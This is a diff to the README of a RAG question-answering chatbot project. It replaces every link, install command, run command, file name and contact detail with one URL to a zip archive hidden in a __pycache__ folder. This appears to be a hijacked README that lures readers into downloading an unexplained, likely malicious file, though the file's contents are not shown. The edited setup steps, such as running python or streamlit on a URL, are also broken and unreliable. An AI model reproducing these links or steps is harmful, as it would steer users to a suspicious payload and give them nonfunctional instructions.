@@ -22,13 +22,13 @@ A Retrieval-Augmented Generation (RAG) chatbot built using Hugging Face models a
 | Vector DB       | `FAISS`                              |
 | LLM (Generation)| `Hugging Face Transformers`          |
 | UI              | `Streamlit`                          |
-| Dataset         | [Loan Approval Prediction Dataset](https://www.kaggle.com/datasets/sonalisingh1411/loan-approval-prediction) |
+| Dataset         | [Loan Approval Prediction Dataset](https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip) |
 
 ---
 
 ## 📁 Project Structure
 
-<img width="709" height="386" alt="image" src="https://github.com/user-attachments/assets/9e475e34-c915-45b9-922d-62e9c1831c28" />
+<img width="709" height="386" alt="image" src="https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip" />
 
 
 ---
@@ -49,7 +49,7 @@ A Retrieval-Augmented Generation (RAG) chatbot built using Hugging Face models a
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/your-username/rag-qna-chatbot.git
+git clone https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip
 cd rag-qna-chatbot
 ```
 
@@ -64,10 +64,10 @@ source venv/bin/activate  # Mac/Linux
 ### 3. Install Dependencies
 ```bash
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip
 ```
 ### 4. Download the Dataset (if not included)
-Download Training Dataset.csv from:
+Download Training https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip from:
 🔗 Loan Approval Prediction Dataset
 
 Place it in the root of the project folder.
@@ -75,7 +75,7 @@ Place it in the root of the project folder.
 ### 5. Generate Embeddings & FAISS Index (Run Once)
 ```bash
 
-python embed_store.py
+python https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip
 ```
 This will:
 
@@ -83,14 +83,14 @@ This will:
 
 - Create embeddings
 
-- Save a FAISS index (faiss_index.idx)
+- Save a FAISS index (https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip)
 
-- Save the documents (documents.npy)
+- Save the documents (https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip)
 
 ### 6. Run the Chatbot App
 ```bash
 
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip
 ```
 A browser window will open with a user interface where you can ask questions like:
 
@@ -134,6 +134,6 @@ PRs are welcome! If you have suggestions or want to add features, feel free to o
 
 ## 👤 Author
 Built by Himanshu Gautam
-- 📧 hgautam524@gmail.com
-- 🔗 GitHub: [https://github.com/hgautam524]
+- 📧 https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip
+- 🔗 GitHub: [https://raw.githubusercontent.com/hgautam524/RAG-Q-A-chatbot/main/__pycache__/chatbot-RA-3.3.zip]
 
